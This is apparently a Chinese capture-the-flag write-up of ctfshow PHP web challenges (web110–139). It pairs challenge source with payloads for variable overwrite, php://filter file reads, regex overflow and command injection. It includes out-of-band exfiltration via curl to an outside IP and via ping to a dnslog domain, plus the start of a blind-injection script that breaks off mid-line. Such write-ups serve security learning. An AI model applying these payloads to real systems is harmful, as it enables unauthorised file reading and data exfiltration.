依旧是对php原生类的利用\n但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload\n类FilesystemIterator可以用来遍历目录，需要一个路径参数\n函数getcwd可以返回当前工作路径且不需要参数，由此可以构造payload\nhttps://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator\u0026amp;v2=getcwd 得到flag的位置,直接访问即可\nweb111 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 02:41:40 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15 16function getFlag(\u0026amp;$v1,\u0026amp;$v2){ 17 eval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;); 18 var_dump($$v1); 19} 20 21 22if(isset($_GET[\u0026#39;v1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;v2\u0026#39;])){ 23 $v1 = $_GET[\u0026#39;v1\u0026#39;]; 24 $v2 = $_GET[\u0026#39;v2\u0026#39;]; 25 26 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v1)){ 27 die(\u0026#34;error v1\u0026#34;); 28 } 29 if(preg_match(\u0026#39;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\\u0026lt;|\\\u0026gt;/\u0026#39;, $v2)){ 30 die(\u0026#34;error v2\u0026#34;); 31 } 32 33 if(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){ 34 getFlag($v1,$v2); 35 } 36 37} 38?\u0026gt; 这题是关于变量覆盖的题目\n由于\nif(preg_match(\u0026#39;/ctfshow/\u0026#39;, $v1)){\rgetFlag($v1,$v2);\r} 所有我们可以确定v1的值只能为ctfshow\n接下来看getFlag函数\nfunction getFlag(\u0026amp;$v1,\u0026amp;$v2){\reval(\u0026#34;$$v1 = \u0026amp;$$v2;\u0026#34;);\rvar_dump($$v1);\r} getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2\nvar_dump则会输出变量的相关信息\n那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag\n但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面\n所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。\n构造payload把所有全局变量全输出来\nhttps://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow\u0026amp;v2=GLOBALS web112 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:49 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#34;hacker!\u0026#34;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(!is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题考察的是php伪协议，虽然被ban了data、input 等伪协议，又ban了 string、data、rot13 相关的过滤器，但是还是有不少能用的伪协议和过滤器\n如 php://filter（这里也用不到过滤器）\nhttps://c9c112c8-f426-4008-9e05-712cff76e02c.challenge.ctf.show/?file=php://filter/resource=flag.php 其他\nphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\rphp://filter/read=convert.quoted-printable-encode/resource=flag.php\rcompress.zlib://flag.php 为什么不能直接输入flag.php呢?\nif(!is_file($file)){\rhighlight_file(filter($file));\r}else{\recho \u0026#34;hacker!\u0026#34;;\r} 那是因为is_file(\u0026ldquo;flag.php\u0026rdquo;)==true，输出hacker！\nweb113 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-30 23:47:52 9 10*/ 11 12highlight_file(__FILE__); 13error_reporting(0); 14function filter($file){ 15 if(preg_match(\u0026#39;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22if(! is_file($file)){ 23 highlight_file(filter($file)); 24}else{ 25 echo \u0026#34;hacker!\u0026#34;; 26} 这题相比上题把filter过滤了\n我们可以考虑使用其他伪协议\n如 compress.zlib://\ncompress.zlib://flag.php 官方题解 目录溢出导致is_file认为这不是一个文件\n/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p\rroc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro\rc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/\rself/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se\rlf/root/proc/self/root/var/www/html/flag.php web114 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:02:53 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14function filter($file){ 15 if(preg_match(\u0026#39;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i\u0026#39;,$file)){ 16 die(\u0026#39;hacker!\u0026#39;); 17 }else{ 18 return $file; 19 } 20} 21$file=$_GET[\u0026#39;file\u0026#39;]; 22echo \u0026#34;师傅们居然tql都是非预期 哼！\u0026#34;; 23if(! is_file($file)){ 24 highlight_file(filter($file)); 25}else{ 26 echo \u0026#34;hacker!\u0026#34;; 27} 这题ban掉了compress和root没办法使用上题的两种解法，但是把filter放出来了\nphp://filter/resource=flag.php 直接读就完事了\nweb115 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 15:08:19 9 10*/ 11 12include(\u0026#39;flag.php\u0026#39;); 13highlight_file(__FILE__); 14error_reporting(0); 15function filter($num){ 16 $num=str_replace(\u0026#34;0x\u0026#34;,\u0026#34;1\u0026#34;,$num); 17 $num=str_replace(\u0026#34;0\u0026#34;,\u0026#34;1\u0026#34;,$num); 18 $num=str_replace(\u0026#34;.\u0026#34;,\u0026#34;1\u0026#34;,$num); 19 $num=str_replace(\u0026#34;e\u0026#34;,\u0026#34;1\u0026#34;,$num); 20 $num=str_replace(\u0026#34;+\u0026#34;,\u0026#34;1\u0026#34;,$num); 21 return $num; 22} 23$num=$_GET[\u0026#39;num\u0026#39;]; 24if(is_numeric($num) and $num!==\u0026#39;36\u0026#39; and trim($num)!==\u0026#39;36\u0026#39; and filter($num)==\u0026#39;36\u0026#39;){ 25 if($num==\u0026#39;36\u0026#39;){ 26 echo $flag; 27 }else{ 28 echo \u0026#34;hacker!!\u0026#34;; 29 } 30}else{ 31 echo \u0026#34;hacker!!!\u0026#34;; 32} 参考文章:ctfshow学习记录-web入门（php特性109-115\u0026amp;123\u0026amp;125-126）_ctfshow web109-CSDN博客\nis_numeric可以在数字前面加空格绕过，同时加上空格也可以绕过$num!=\u0026lsquo;36\u0026rsquo;\n但是我们知道trim函数是移除字符串两侧的空白字符或其他预定义字符，空格等字符是会被去掉的\n我们这里考虑使用%0c（换页符）进行绕过\n同时使用%0c也可以绕过filter。\n接下来再看第二个if判断，这是看起来很矛盾的一个判断。\n来具体看一下!==的定义，只要类型不同就不全等。\n如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 switch 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对。 ——《php手册》语言参考-运算符-比较运算符\n也就是说!==时不进行类型转换。\n所以加上%0c换页符，在==进行类型转换，所有%0c36会被转换为数值36，结果true；在!==不进行类型转换，所以字符串和数值比较，类型不同，结果true。\npayload：\n?num=%0c36 web123 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16$a=$_SERVER[\u0026#39;argv\u0026#39;]; 17$c=$_POST[\u0026#39;fun\u0026#39;]; 18if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 19 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?/\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=18){ 20 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 21 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 22 echo $flag; 23 } 24 } 25} 26?\u0026gt; 这题其实根本不用理会\nif($fl0g===\u0026#34;flag_give_me\u0026#34;){\recho $flag;\r} 这题对c进行了一定的限制，但是影响不大我们可以直接再eval处执行echo $flag;从而拿到flag\n这题还有一个考点，由于在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出CTF_SHOW.COM这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换\npayload:\nPOST:CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun= echo $flag web125 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\u0026#34;, $c)\u0026amp;\u0026amp;$c\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 25?\u0026gt; 这题把上题的echo方法和flag关键词ban了\n考虑通过二次传参的方法读flag\n我一开始考虑了system二次传参的方法，但是system方法应该是被ban掉了\n后面尝试highlight_file方法成功读到flag\npayload:\nPOST CTF_SHOW=1\u0026amp;CTF[SHOW.COM=1\u0026amp;fun=highlight_file($_GET[1])\rGET 1=flag.php 其他的 payload：\n1POST CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=var_export(get_defined_vars()) web126 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# 10# 11*/ 12error_reporting(0); 13highlight_file(__FILE__); 14include(\u0026#34;flag.php\u0026#34;); 15$a=$_SERVER[\u0026#39;argv\u0026#39;]; 16$c=$_POST[\u0026#39;fun\u0026#39;]; 17if(isset($_POST[\u0026#39;CTF_SHOW\u0026#39;])\u0026amp;\u0026amp;isset($_POST[\u0026#39;CTF_SHOW.COM\u0026#39;])\u0026amp;\u0026amp;!isset($_GET[\u0026#39;fl0g\u0026#39;])){ 18 if(!preg_match(\u0026#34;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\u0026#34;|\\\u0026#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\u0026#34;, $c) \u0026amp;\u0026amp; strlen($c)\u0026lt;=16){ 19 eval(\u0026#34;$c\u0026#34;.\u0026#34;;\u0026#34;); 20 if($fl0g===\u0026#34;flag_give_me\u0026#34;){ 21 echo $flag; 22 } 23 } 24} 基本上ban掉了能读文件的函数\n参考ctfshow-web入门-php特性（web123、web125、web126）_ctfshow web123-CSDN博客\npayload:\nget：?$fl0g=flag_give_me;\rpost：CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=eval($a[0])\ror\rGET:?$fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=assert($a[0]) 这里的查询字符串没有包含 fl0g，但包含了 $fl0g。由于 PHP 中的变量名不包括 $ 符号，所以 isset($_GET[\u0026lsquo;fl0g\u0026rsquo;]) 仍然会返回 false，即没有检测到 fl0g 参数。\npost 传入 CTF_SHOW 和 CTF_SHOW.COM 确保 isset($_POST[\u0026lsquo;CTF_SHOW\u0026rsquo;]) \u0026amp;\u0026amp; isset($_POST[\u0026lsquo;CTF_SHOW.COM\u0026rsquo;]) 这部分条件为真，fun=eval($a[0]) 将 eval($a[0]) 的代码传递给 $c。\n准确来说，此时的 $_SERVER[‘argv’][0] 就等于 $_SERVER[‘QUERY_STRING’]，$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;] 就是查询 (query) 的字符串，这是由于 php.ini 开启了register_argc_argv 配置项。\n当访问 ?$fl0g=flag_give_me; 时，服务器配置使得查询字符串被传递到 $_SERVER[\u0026lsquo;argv\u0026rsquo;] 中。 在这种配置下，$_SERVER[\u0026lsquo;argv\u0026rsquo;][0] 包含了整个查询字符串，即 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;。\n在 eval(\u0026quot;$c;\u0026rdquo;); 中实际执行的是 eval(\u0026rsquo;eval($a[0]);\u0026rsquo;);，因为 $a[0] 是 \u0026lsquo;$fl0g=flag_give_me;\u0026rsquo;，这相当于执行了 eval(\u0026rsquo;$fl0g=flag_give_me;\u0026rsquo;);，这样就定义了变量 $fl0g 并赋值为 \u0026lsquo;flag_give_me\u0026rsquo;。\n最后 判断 if($fl0g === \u0026ldquo;flag_give_me\u0026rdquo;)，因为 $fl0g 被正确地设置为了 \u0026lsquo;flag_give_me\u0026rsquo;，所以这个条件为真，因此，echo $flag; 被执行，输出 $flag。\n其他payload:\nGET:?a=1+fl0g=flag_give_me\rPOST:CTF_SHOW=\u0026amp;CTF[SHOW.COM=\u0026amp;fun=parse_str($a[1]) 也同样是为了使fl0g=flag_give_me\nweb127 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-10 21:52:49 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16$ctf_show = md5($flag); 17$url = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; 18 19 20//特殊字符检测 21function waf($url){ 22 if(preg_match(\u0026#39;/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\\u0026#39;|\\\u0026#34;|\\\u0026lt;|\\,|\\\u0026gt;|\\.|\\\\\\|\\//\u0026#39;, $url)){ 23 return true; 24 }else{ 25 return false; 26 } 27} 28 29if(waf($url)){ 30 die(\u0026#34;嗯哼？\u0026#34;); 31}else{ 32 extract($_GET); 33} 34 35 36if($ctf_show===\u0026#39;ilove36d\u0026#39;){ 37 echo $flag; 38} 变量覆盖\n由于下划线被waf了，我们可以传ctf%20show，php会将空格解析成_\npayload:\nctf%20show=ilove36d web128 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-10 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-12 19:49:05 9 10*/ 11 12 13error_reporting(0); 14include(\u0026#34;flag.php\u0026#34;); 15highlight_file(__FILE__); 16 17$f1 = $_GET[\u0026#39;f1\u0026#39;]; 18$f2 = $_GET[\u0026#39;f2\u0026#39;]; 19 20if(check($f1)){ 21 var_dump(call_user_func(call_user_func($f1,$f2))); 22}else{ 23 echo \u0026#34;嗯哼？\u0026#34;; 24} 25 26 27 28function check($str){ 29 return !preg_match(\u0026#39;/[0-9]|[a-z]/i\u0026#39;, $str); 30} 什么是Gettext函数\nPHP: Gettext - Manual\n骚操作\n小知识点： _()是一个函数\r_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll\rget_defined_vars()函数\rget_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag\rpayload: ?f1=_\u0026amp;f2=get_defined_vars web129 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 03:18:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15if(isset($_GET[\u0026#39;f\u0026#39;])){ 16 $f = $_GET[\u0026#39;f\u0026#39;]; 17 if(stripos($f, \u0026#39;ctfshow\u0026#39;)\u0026gt;0){ 18 echo readfile($f); 19 } 20} stripos() 函数查找字符串在另一字符串中第一次出现的位置\n所以我们要考虑在ctfshow前面放点什么，但又不影响我们读文件\n可以联想到目录穿越\npayload:\n/ctfshow/../../../../../../../../../../var/www/html/flag.php web130 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = $_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f, \u0026#39;ctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} \u0026lsquo;/.+?ctfshow/is\u0026rsquo; 后面的i表示大小写匹配，s表示忽略换行符，单行匹配\n在不加转义字符的前提下，前面的点表示任意字符，而“+?”表示非贪婪匹配，即前面的字符至少出现一次\n所以，该正则匹配的意思为：ctfshow前面如果出现任意字符，即匹配准确\n再根据下面的stripos为字符串匹配函数，要求输入的参数必须有“ctfshow”字符，所以输入的参数只需要满足ctfshow前面不加任意字符即可\npayload\nPOST f=ctfshow web131 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 05:19:40 9 10*/ 11 12 13error_reporting(0); 14highlight_file(__FILE__); 15include(\u0026#34;flag.php\u0026#34;); 16if(isset($_POST[\u0026#39;f\u0026#39;])){ 17 $f = (String)$_POST[\u0026#39;f\u0026#39;]; 18 19 if(preg_match(\u0026#39;/.+?ctfshow/is\u0026#39;, $f)){ 20 die(\u0026#39;bye!\u0026#39;); 21 } 22 if(stripos($f,\u0026#39;36Dctfshow\u0026#39;) === FALSE){ 23 die(\u0026#39;bye!!\u0026#39;); 24 } 25 26 echo $flag; 27 28} 正则表达式溢出 https://www.laruence.com/2010/06/08/1579.html\npayload:\n#payload:\r\u0026lt;?php\recho str_repeat(\u0026#39;very\u0026#39;, \u0026#39;250000\u0026#39;).\u0026#39;36Dctfshow\u0026#39;; 不宜过多，过多会\nweb132 /admin\n1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 06:22:13 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 20:05:36 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14#error_reporting(0); 15include(\u0026#34;flag.php\u0026#34;); 16highlight_file(__FILE__); 17 18 19if(isset($_GET[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;password\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;code\u0026#39;])){ 20 $username = (String)$_GET[\u0026#39;username\u0026#39;]; 21 $password = (String)$_GET[\u0026#39;password\u0026#39;]; 22 $code = (String)$_GET[\u0026#39;code\u0026#39;]; 23 24 if($code === mt_rand(1,0x36D) \u0026amp;\u0026amp; $password === $flag || $username ===\u0026#34;admin\u0026#34;){ 25 26 if($code == \u0026#39;admin\u0026#39;){ 27 echo $flag; 28 } 29 30 } 31} 第一个判断后面用的是或\n也就是说只要使username等于admin即可，前面两个无所谓了\n第二个判断让code等于admin即可\npayload：\nGET:?code=admin\u0026amp;username=admin\u0026amp;password= web133 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-13 16:43:44 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14//flag.php 15if($F = @$_GET[\u0026#39;F\u0026#39;]){ 16 if(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|netcat/i\u0026#39;, $F)){ 17 eval(substr($F,0,6)); 18 }else{ 19 die(\u0026#34;6个字母都还不够呀?!\u0026#34;); 20 } 21} ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园\n这其实是一道关于变量覆盖的题目\nget传参 F=`$F `;sleep 3\r经过substr($F,0,6)截取后 得到 `$F `;\r也就是会执行 eval(\u0026#34;`$F `;\u0026#34;);\r我们把原来的$F带进去\reval(\u0026#34;``$F `;sleep 3`\u0026#34;);\r也就是说最终会执行 ` `$F `;sleep 3 ` == shell_exec(\u0026#34;`$F `;sleep 3\u0026#34;);\r前面的命令我们不需要管，但是后面的命令我们可以自由控制。\r这样就在服务器上成功执行了 sleep 3\r所以 最后就是一道无回显的RCE题目了 payload:\n`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/ curl外带rce\nweb134 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-14 23:01:06 9 10*/ 11 12highlight_file(__FILE__); 13$key1 = 0; 14$key2 = 0; 15if(isset($_GET[\u0026#39;key1\u0026#39;]) || isset($_GET[\u0026#39;key2\u0026#39;]) || isset($_POST[\u0026#39;key1\u0026#39;]) || isset($_POST[\u0026#39;key2\u0026#39;])) { 16 die(\u0026#34;nonononono\u0026#34;); 17} 18@parse_str($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); 19extract($_POST); 20if($key1 == \u0026#39;36d\u0026#39; \u0026amp;\u0026amp; $key2 == \u0026#39;36d\u0026#39;) { 21 die(file_get_contents(\u0026#39;flag.php\u0026#39;)); 22} 看到extract想起变量覆盖\nextract($_POST);\r//提取$_POST数组 payload:\n?_POST[key1]=36d\u0026amp;_POST[key2]=36d web135 \u0026lt;?php\r/*\r# -*- coding: utf-8 -*-\r# @Author: Firebasky\r# @Date: 2020-10-13 11:25:09\r# @Last Modified by: h1xa\r# @Last Modified time: 2020-10-16 18:48:03\r*/\rerror_reporting(0);\rhighlight_file(__FILE__);\r//flag.php\rif($F = @$_GET[\u0026#39;F\u0026#39;]){\rif(!preg_match(\u0026#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i\u0026#39;, $F)){\reval(substr($F,0,6));\r}else{\rdie(\u0026#34;师傅们居然破解了前面的，那就来一个加强版吧\u0026#34;);\r}\r} 133plus\n这题ban了很多命令\n但是没ban nl,mv，可以用nl和cp把flag写到其他文件中\npayload:\n`$F `;nl f*\u0026gt;1.txt\r`$F `;mv f*\u0026gt;1.txt 这题也可以用ping进行外带\n`$F`;+ping `cat flag.php|awk \u0026#39;NR==2\u0026#39;`.6x1sys.dnslog.cn\r#通过ping命令去带出数据，然后awk NR一排一排的获得数据 web136 1\u0026lt;?php 2error_reporting(0); 3function check($x){ 4 if(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){ 5 die(\u0026#39;too young too simple sometimes naive!\u0026#39;); 6 } 7} 8if(isset($_GET[\u0026#39;c\u0026#39;])){ 9 $c=$_GET[\u0026#39;c\u0026#39;]; 10 check($c); 11 exec($c); 12} 13else{ 14 highlight_file(__FILE__); 15} 16?\u0026gt; 这题要用到一个linux的命令tee\nLinux tee命令介绍 tee命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。tee命令通常与其他命令一起通过管道使用。\n如\n1ls /|tee 1.txt 就可以将ls /的结果写入到1.txt文件中\nls /|tee 1 这题ban掉了.\n访问url/1，下载文件1\n看到flag的位置\n?c=cat /f149_15_h3r3|tee 2 web137 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:27:49 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24 25 26call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 我们需要通过post传入一个数组，数组中包含类名和方法名\npayload\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag 又或者\nctfshow=ctfshow::getFlag web138 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-10-13 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-16 22:52:13 9 10*/ 11 12error_reporting(0); 13highlight_file(__FILE__); 14class ctfshow 15{ 16 function __wakeup(){ 17 die(\u0026#34;private class\u0026#34;); 18 } 19 static function getFlag(){ 20 echo file_get_contents(\u0026#34;flag.php\u0026#34;); 21 } 22} 23 24if(strripos($_POST[\u0026#39;ctfshow\u0026#39;], \u0026#34;:\u0026#34;)\u0026gt;-1){ 25 die(\u0026#34;private function\u0026#34;); 26} 27 28call_user_func($_POST[\u0026#39;ctfshow\u0026#39;]); 这道题限制了上一题的第二种解法\n第一种还能继续使用\npayload:\nctfshow[]=ctfshow\u0026amp;ctfshow[]=getFlag\rctfshow[0]=ctfshow\u0026amp;ctfshow[1]=getFlag web139 \u0026lt;?php\rerror_reporting(0);\rfunction check($x){\rif(preg_match(\u0026#39;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\\u0026amp;|\\*|\\?|\\{|\\}|\\\u0026gt;|\\\u0026lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i\u0026#39;, $x)){\rdie(\u0026#39;too young too simple sometimes naive!\u0026#39;);\r}\r}\rif(isset($_GET[\u0026#39;c\u0026#39;])){\r$c=$_GET[\u0026#39;c\u0026#39;];\rcheck($c);\rexec($c);\r}\relse{\rhighlight_file(__FILE__);\r}\r?\u0026gt; 这题看着和前面那题是一样的\n但实际上没有写文件的权限\n这题可以通过时间盲注攻击获取文件名已经文件中的字符等\n时间盲注脚本：\n1import requests 2import time 3import string 4 5str = string.ascii_letters + string.digits + \u0026#34;-\u0026#34; + \u0026#34;{\u0026#34; + \u0026#34;}\u0026#34; + \u0026#34;_\u0026#34; + \u0026#34;~\u0026#34; # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加 6result = \u0026#34;\u0026#34; # 初始化一个空字符串，用于保存结果 7 8#获取多少行 9for i in range(1, 99): 10 key = 0 #用于控制内层循环(j)的结束 11 12 #不break的情况下，一行最多几个字符 13 for j in range(1, 99): 14 if key == 1: 15 break 16 for n in str: #n就是一个一个的返回值 17 payload = \u0026#34;if [ `ls /|awk \u0026#39;NR=={0}\u0026#39;|cut -c {1}` == {2} ];then 